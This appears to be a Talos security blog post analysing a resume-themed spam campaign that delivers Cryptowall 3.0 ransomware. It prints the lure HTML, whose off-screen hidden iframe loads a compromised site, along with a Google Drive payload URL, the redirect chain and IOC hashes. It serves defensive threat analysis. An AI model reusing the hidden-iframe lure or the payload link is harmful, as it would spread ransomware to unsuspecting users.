@@ -1,0 +1,86 @@
+
+My Resume Protects All Your Files
+
+
+This post was authored by Nick Biasini
+
+Talos has found a new spam campaign that is using multiple layers of obfuscation to attempt to evade detection.  spammers are always evolving to get their messages to the end users by bypassing spam filters while still appearing convincing enough to get a user to complete the actions required to infect the system. The end payload for this campaign is Cryptowall 3.0. Talos has covered this threat repeatedly and this is another example of how the success of Ransomware has pushed it to one of the top threats we are seeing today. Whether its Exploit Kits or spam messages threat actors are pushing as many different variants of Ransomware as possible.
+
+
+Email Details
+
+The use of resume based spam isn’t anything new.  An analysis of our telemetry has found countless messages in the last 30 days related to Resumes. Threat actors have tried many different techniques associated with these messages including using password protected zip files, word documents with embedded macros, and malicious URLs redirecting back to a malicious sample. This threat combined a series of techniques to try and avoid detection that has been surprisingly successful against some products. Below is a sample of one of the emails that we saw in our telemetry.
+
+
+
+Sample Email
+
+
+The concept for the email is simple enough with an attached zip file that contains a resume. One interesting thing is that the threat actor made it look like a reply to an existing email and not something that was sent unsolicited. Also, note the filesize this is only a 276 byte zip file. Inside that zip file is an HTML file that will look something similar to resume4522.html. Below are the contents of the HTML file:
+<html>
+<head>
+</head>
+<body>
+<iframe src="http://<redacted>/cgi/resume2.php?id=726"  width="911" height="818" style="position:absolute;left:-10118px;"></iframe>
+</body>
+</html>
+
+If the user does open the HTML document they are redirected to a compromised WordPress site that redirects via another iframe to the following URL via SSL:
+
+https://docs.google.com/uc?export=download&id=0B-HWsX8wPhPFX1M1OEtuT19Za0E
+
+The file stored in Google Drive at this location is named my_resume_pdf.zip. This is where the actual malicious file resides. Inside this zip file is another file that will look something like my_resume_pdf_id_6721-3921-3211.scr. When executed this file is dropping Cryptowall on the system and compromising it. Below is a diagram showing the full infection path.
+
+
+
+Infection Chain for this Campaign
+
+
+This is another example of how attackers are combining multiple layers of obfuscation to get users infected and this particular technique appears to be quite successful. An analysis of the malicious URL in question showed that a large number of users that received the email were seen attempting to download the file from the compromised WordPress site. These attacks are successful because these types of emails are seen legitimately as well. If they happen to reach someone who is in the process of hiring or evaluating candidates they are likely to open the attachments and follow the process. In the past we have seen campaigns similar to this but the malicious file was present inside the zip file and not hidden through multiple layers of redirection via iframes. This also allows a threat actor to vary the payload by doing nothing more than changing the file stored on the Google Drive.
+
+
+Payload
+
+This is yet another threat that is delivering Ransomware. The amount of threats that have started delivering Ransomware is growing at an alarming rate. Talos recently discussed an Angler Exploit Kit campaign delivering Cryptowall 3.0 and this threat is doing the same. One interesting thing is the amount of small variations that are being seen in Cryptowall 3.0 now. The hashes are changing often allowing for a longer window of exploitation. You can track the effectiveness by looking at tools like VirusTotal. When the spam campaign starts the detection is limited to only a couple Antivirus technologies and none of them successfully detect it as Ransomware.  Within 24 hours the detection is up to over 25 Antivirus engines and the campaign is over. Now the attackers will start a new campaign through Exploit Kit or spam using a new hash and get that initial 24 hour window of success. This is something Talos has observed in other common threats like Dridex and Upatre. It appears that threat actors are now adding Ransomware to this group of ever evolving, ever present threats on the Internet.
+
+
+IOC
+
+Hashes:
+Zip Files
+6be76dcc877ac42d5af53807b4be92172dea245142e948dba1367c274ab6a508
+36da04ec68a9e0031f89d12065317f8a64ca3598ad0349991fb684e323435a62
+10fbbeb985f18de13a145f05314a4ab2aaf42fcc276c3e24c6491b6482fe1d5f
+2a7b9016bb8004d101dba337c5d1e679c4b88bea198e425a42081ec4186e5b45
+b53b58df6445bc4c754f178af66f0b3a5ddf1e93971439d05be61ad9f0bc0997
+5fead4017f0770fd0dd8a99b97b514730f46c30ecd61857b1359701b2d73caa7
+0c066baf5153cd8e522b74316fed24c075020ff59c52361f253918fa2d66c7ad
+3889d489f3905164b2c5731b8fb9c9bbe95ead175c7070f0aa77efe040a18b35
+5bf3471231a4b0a5ad0685c9ee36e9f1f21df3f6c8fcbcb83d60fd64cc513582
+f6ad2ad1fceb98f6a61360afd17d02dab4c0d2919fa6ddfd978582cf044a9655
+81af832b81e034dfe742698104a90c1ff6bd490e1c289a49968a15036a268a6b
+2c03f7497ea8cfc4e8633f0ced8d28e65d8505f94e8d28297c7096f42d8bf2a2
+2dd699613d9b6b709e4667457acefc3009db57684a85f488396c4e8f4c2d9521
+
+Cryptowall 3.0
+41188ce5a34605fd853b48ea1f026dc5ffc778c808be57d630f87146c7dd3bad
+
+
+Conclusion
+
+Threat actors are always looking at ways to monetize their activities. In the past this would involve things like banking credentials, spam generation, or other monetary value credentials. Now we are seeing threats deliver Ransomware in every way possible. As users continue to pay the ransom bad guys will keep figuring out new ways to get it installed on your system. This is just another example of this type of behavior and now hiding in multiple layers of obfuscation. Embedding an HTML document that links to a compromised site which redirects to a file hosted on a Google Drive over SSL. That is an effective way to get a file on an end system. Combine that with an ever evolving Ransomware variant that giving you a window of up to 24 hours where, if you can get the file on the desktop, you are likely to get it executed. Once executed it's just a matter of time before the user pays the ransom to get their files back.
+
+If you haven’t been infected by ransomware yet the likelihood is either you or someone you know will be in the future. Remember that the best way to counter these effects is to backup your data early and often. Additionally, use best practices like not keeping the drives attached to the system or even rotating two drives to decrease the potential for severe data loss. The cost of doing these backups is small compared to the cost of paying the ransom or loosing the data and remember paying the ransom just encourages more development. Additionally, even if you pay the ransom there is no guarantee that anything has been removed from your system and the possibility of persistent infection remains.
+
+
+Coverage
+
+Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.
+
+CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.
+
+The Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors.
+
+ESA can block malicious emails including phishing and malicious attachments sent by threat actors as part of their campaign
+
+
